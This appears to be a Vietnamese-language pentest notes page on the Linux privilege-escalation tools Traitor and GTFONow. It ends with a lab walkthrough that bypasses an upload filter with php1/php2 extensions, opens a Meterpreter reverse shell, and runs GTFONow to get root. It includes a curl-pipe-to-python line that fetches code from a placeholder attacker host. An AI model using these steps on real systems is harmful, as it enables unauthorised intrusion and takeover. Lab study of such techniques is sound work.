# Traitor
## Giới thiệu
[https://github.com/liamg/traitor](https://github.com/liamg/traitor)
- Một tool tự động tìm các misconfiguration và khai thác chúng để leo quyền root
- Các lỗ hổng mà tool này có thể khai thác ![image](https://github.com/Myozz/everyTools/assets/94811005/e68717fd-b309-482d-8f4f-fe9269831e5a)
- Đây là một tool không được cập nhật kể từ 2022 nên có thể thiếu các vuln hay misconfig mới
## Các tuỳ chọn chính
- Nếu chỉ chạy tool mà không có bất kì flag nào thì tool sẽ tìm các vuln/misconfig mà có thể sử dụng để leo quyền
- ```-p```: Cung cấp password của người dùng hiện tại của mục tiêu (dùng để xác thực trong trường hợp cần thiết)
- ```-a```: Thử khai thác từng lỗ hổng có thể, dừng lại khi lấy được root shell
- ```-e```: Chỉ định misconfig/vuln để khai thác trên mục tiêu
# GTFOnow
- Link: [https://github.com/Frissi0n/GTFONow](https://github.com/Frissi0n/GTFONow)
- Một tool có khả năng khai thác hầu hết các misconfig trên GTFObin, và vẫn được cập nhật cho tới thời điểm hiện tại
- Có thể exploit bằng curl thay vì phải upload lên mục tiêu

      curl http://attacker.host/gtfonow.py | python
## Các tuỳ chọn chính
- ```--level <LEVEL>```: Tuỳ chỉnh giữa 2 level:
  - ```1```: Tuỳ chọn mặc định, quét nhanh mục tiêu
  - ```2```: Tuỳ chọn cho phép quét rộng hơn
- ```--risk <RISK>```: Mức độ rủi ro
  - ```1```: Tuỳ chọn mặc định, đảm bảo an toàn cho mục tiêu
  - ```2```: Tool sẽ tự động chỉnh sửa một số file cần thiết, chỉ nên sử dụng khi đã nắm rõ chúng làm những gì
- ```--command <COMMAND>```: Thực hiện một câu lệnh sau khi đã leo quyền thành công
- ```--auto```: Tự động khai thác thay vì yêu cầu chúng ta chọn
- ```-v```: Theo dõi tiến độ khi khai thác 
## Thử nghiệm
- Ta sẽ thực hiện qua một lab upload vuln ![image](https://github.com/Myozz/everyTools/assets/94811005/8c3a5213-aeac-4cee-ac09-68307936bfd1
- Sử dụng các công cụ tìm path/dir trên mục tiêu ta biết được mục tiêu lưu file tại path ```/uploads```
- Tiếp tục kiểm tra xem mục tiêu cho phép upload định dạng file nào, có thể tham khảo qua [https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln)
- Sau khi thực hiện kiểm tra, ta thấy được có thể sử dụng các định dạng file php1, php2,... (trừ php) có thể được sử dụng để khai thác
- Thực hiện tạo payload với định dạng file như trên, tham khảo các tool tạo payload ở [đây](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln/Payloads)
- Upload payload vừa tạo được lên mục tiêu (Có thể tận dụng tool filepwner ở [https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln](https://github.com/Myozz/everyTools/tree/main/File%20Upload%20Vuln) để upload file qua config của nó, rồi thực hiện reverse shell (nên sử dụng meterpreter để có thể upload các công cụ kể trên lên mục tiêu
- Sau khi có được Meterpreter, bây giờ ta sẽ thử upload file GTFOnow lên mục tiêu bằng lệnh ```upload``` và dùng lệnh ```shell``` để thực thi lệnh trên mục tiêu ![image](https://github.com/Myozz/everyTools/assets/94811005/54420ce7-9162-4395-854c-81e747478410)
- Thực thi lệnh ```python gtfonow.py -a``` để bắt đầu khai thác tự động ![image](https://github.com/Myozz/everyTools/assets/94811005/c41eb7a8-29fa-425c-a729-b11adff819fb) 
- Như vậy là ta đã thành công leo quyền root lên mục tiêu
